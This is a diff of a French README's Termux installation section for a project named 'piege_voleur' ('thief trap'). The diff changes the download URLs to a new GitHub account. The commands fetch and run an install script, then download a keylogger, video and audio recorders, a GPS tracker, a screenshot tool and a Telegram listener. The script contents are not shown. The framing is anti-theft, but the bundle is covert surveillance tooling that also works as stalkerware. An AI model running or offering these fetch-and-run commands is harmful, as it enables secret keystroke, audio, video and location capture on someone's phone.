@@ -22,15 +22,15 @@ python3 server.py
 ## installation sur termux
 
 ```bash
-wget https://raw.githubusercontent.com/trhacknon/piege_voleur/main/install_termux.sh -O install_termux.sh
+wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/install_termux.sh -O install_termux.sh
 bash install_termux.sh
 
-wget https://raw.githubusercontent.com/trhacknon/piege_voleur/main/keylogger_termux.sh -O keylogger_termux.sh
-wget https://raw.githubusercontent.com/trhacknon/piege_voleur/main/record_video.sh -O record_video.sh
-wget https://raw.githubusercontent.com/trhacknon/piege_voleur/main/record_audio.sh -O record_audio.sh
-wget https://raw.githubusercontent.com/trhacknon/piege_voleur/main/gps_tracker.sh -O gps_tracker.sh
-wget https://raw.githubusercontent.com/trhacknon/piege_voleur/main/screenshot.sh -O screenshot.sh
-wget https://raw.githubusercontent.com/trhacknon/piege_voleur/main/telegram_listener.sh -O telegram_listener.sh
+wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/keylogger_termux.sh -O keylogger_termux.sh
+wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/record_video.sh -O record_video.sh
+wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/record_audio.sh -O record_audio.sh
+wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/gps_tracker.sh -O gps_tracker.sh
+wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/screenshot.sh -O screenshot.sh
+wget https://raw.githubusercontent.com/trh4ckn0n/piege_voleur/main/telegram_listener.sh -O telegram_listener.sh
 
 chmod +x *.sh
 ```
